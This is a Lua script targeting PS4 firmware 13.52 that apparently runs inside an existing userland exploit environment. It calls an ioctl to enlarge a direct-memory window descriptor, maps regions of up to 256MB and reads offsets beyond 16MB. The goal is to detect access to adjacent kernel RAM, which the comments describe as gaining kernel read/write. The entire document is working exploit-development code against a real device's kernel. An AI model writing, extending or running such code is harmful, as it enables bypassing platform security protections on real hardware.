-- PS4 FW 13.52 - DMEM WINDOW SIZE EXPANSION (r9w) — the kernel-RAM test
-- Set a 64MB window at the descriptor region; mmap 64MB; check content beyond 16MB.
-- Non-zero beyond 16MB = reading/writing adjacent kernel dmap RAM = kernel R/W!

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R9W START ===")
pcall(function()
  local buf = mem.alloc(0x200)

  local sizes = {0x4000000, 0x8000000, 0x10000000}
  for _, sz in ipairs(sizes) do
    pcall(function()
      mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
      mem.write_qword(buf, 0x2ec48000)
      mem.write_qword(buf + 8, sz)
      local r = t(S.ioctl(5, 0x80108002, buf))
      local m = t(S.mmap(0x2ec48000, sz, 3, 0x0001, 5, 0))
      if not (m > 0x100000 and m < 0xFFFFFFFFFF) then
        print(string.format("size=0x%x ioctl=0x%x mmap=0x%x (FAIL)", sz, r, m))
        return
      end
      local s = string.format("size=0x%x ioctl=0x%x mmap=0x%x:", sz, r, m)
      local spots = {0x0, 0x800000, 0x1000000, 0x2000000, 0x4000000, 0x8000000}
      local nonzero = false
      for _, off in ipairs(spots) do
        if off < sz then
          local v = rq(m + off)
          s = s .. string.format(" [+0x%x]=0x%016x", off, v)
          if v ~= 0 then nonzero = true end
        end
      end
      print(s)
      print(string.format("  %s", nonzero and "NON-ZERO BEYOND WINDOW <=KERNEL RAM!" or "all zero beyond descriptor"))
    end)
  end
end)
print("=== R9W DONE ===")
